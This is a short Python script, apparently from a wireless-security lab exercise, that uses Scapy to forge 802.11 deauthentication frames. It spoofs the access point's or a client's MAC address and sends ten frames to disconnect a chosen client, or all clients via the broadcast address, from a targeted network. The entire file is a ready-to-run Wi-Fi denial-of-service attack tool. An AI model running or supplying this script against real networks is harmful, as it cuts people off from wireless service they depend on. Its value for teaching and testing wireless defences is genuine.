import argparse

from scapy.all import conf, sendp
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

# Argument parser taken from https://github.com/catalyst256/MyJunk/blob/master/scapy-deauth.py

# Parsing arguments
parser = argparse.ArgumentParser(prog="Scapy deauth attack",
                                 usage="%(prog)s -i mon0 -b 00:11:22:33:44:55 -c 55:44:33:22:11:00  -r 1",
                                 allow_abbrev=False)

parser.add_argument("-i", "--Interface", required=True,
                    help="The interface that you want to send packets out of, needs to be set to monitor mode")
parser.add_argument("-b", "--BSSID", required=True, help="The BSSID of the Wireless Access Point you want to target")
parser.add_argument("-c", "--Client", required=True,
                    help="The MAC address of the Client you want to kick off the Access Point, use FF:FF:FF:FF:FF:FF if you want a broadcasted deauth to all stations on the targeted Access Point")


parser.add_argument("-r", "--Reason", required=True, help="The reason value of the deauth (1/4/5/8)")

args = parser.parse_args()

# Deauth code

packet = RadioTap() 

# Depending of the reason, the addresses in the dot11 layer are not the same, we could have de-duplicated the code further, at the cost of readability.
# We chose against that trade-off.
# We also decided to force the unspecified reason to be sent from the AP to the client, we could have prompted the user, but we decided against it

if args.Reason in "145":
    packet = packet / Dot11(type=0, subtype=12, addr1=args.Client, addr2=args.BSSID, addr3=args.BSSID) / Dot11Deauth(reason=int(args.Reason))
else:
    packet = packet / Dot11(type=0, subtype=12, addr1=args.BSSID, addr2=args.Client, addr3=args.BSSID) / Dot11Deauth(reason=int(args.Reason))
    

# We decided to set the deauth packet count to 10 and not provide an argument to override it, as it should be enough to force the deauth, even in a highly
# conjested network.
print(f"Sending deauth packets via: {args.Interface} to BSSID: {args.BSSID} for Client: {args.Client} with reason : {args.Reason}")
sendp(packet, iface=args.Interface, count=10)
